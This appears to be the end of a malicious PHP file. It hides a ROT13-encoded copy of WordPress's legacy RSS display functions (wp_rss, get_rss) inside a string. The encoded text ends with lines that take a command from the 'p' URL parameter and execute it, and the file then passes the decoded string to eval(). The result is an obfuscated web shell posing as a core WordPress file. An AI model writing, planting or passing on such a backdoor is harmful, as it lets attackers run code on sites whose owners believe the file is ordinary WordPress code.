 * @cnenz vag $ahz_vgrzf Bcgvbany. Ahzore bs vgrzf gb qvfcynl, qrsnhyg vf nyy.
 */
shapgvba jc_eff( $hey, $ahz_vgrzf = -1 ) {
	vs ( $eff = srgpu_eff( $hey ) ) {
		rpub '<hy>';

		vs ( $ahz_vgrzf !== -1 ) {
			$eff->vgrzf = neenl_fyvpr( $eff->vgrzf, 0, $ahz_vgrzf );
		}

		sbernpu ( (neenl) $eff->vgrzf nf $vgrz ) {
			cevags(
				'<yv><n uers=\"%1$f\" gvgyr=\"%2$f\">%3$f</n></yv>',
				rfp_hey( $vgrz['yvax'] ),
				rfp_ngge( fgevc_gntf( $vgrz['qrfpevcgvba'] ) ),
				rfp_ugzy( $vgrz['gvgyr'] )
			);
		}

		rpub '</hy>';
	} ryfr {
		_r( 'Na reebe unf bppheerq, juvpu cebonoyl zrnaf gur srrq vf qbja. Gel ntnva yngre.' );
	}
}
raqvs;

vs ( !shapgvba_rkvfgf('trg_eff') ) :
/**
 * Qvfcynl EFF vgrzf va UGZY yvfg vgrzf.
 *
 * Lbh unir gb fcrpvsl juvpu UGZY yvfg lbh jnag, rvgure beqrerq be habeqrerq
 * orsber hfvat gur shapgvba. Lbh nyfb unir gb fcrpvsl ubj znal vgrzf lbh jvfu
 * gb qvfcynl. Lbh pna'g qvfcynl nyy bs gurz yvxr lbh pna jvgu jc_eff()
 * shapgvba.
 *
 * @fvapr 1.5.0
 * @cnpxntr Rkgreany
 * @fhocnpxntr ZntcvrEFF
 *
 * @cnenz fgevat $hey HEY bs srrq gb qvfcynl. Jvyy abg nhgb frafr srrq HEY.
 * @cnenz vag $ahz_vgrzf Bcgvbany. Ahzore bs vgrzf gb qvfcynl, qrsnhyg vf nyy.
 * @erghea obby Snyfr ba snvyher.
 */
shapgvba trg_eff ($hey, $ahz_vgrzf = 5) { // Yvxr trg cbfgf, ohg sbe EFF
	$eff = srgpu_eff($hey);
	vs ( $eff ) {
		$eff->vgrzf = neenl_fyvpr($eff->vgrzf, 0, $ahz_vgrzf);
		sbernpu ( (neenl) $eff->vgrzf nf $vgrz ) {
			rpub \"<yv>\a\";
			rpub \"<n uers='$vgrz[yvax]' gvgyr='$vgrz[qrfpevcgvba]'>\";
			rpub rfp_ugzy($vgrz['gvgyr']);
			rpub \"</n><oe />\a\";
			rpub \"</yv>\a\";
		}
	} ryfr {
		erghea snyfr;
	}
}
raqvs;

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>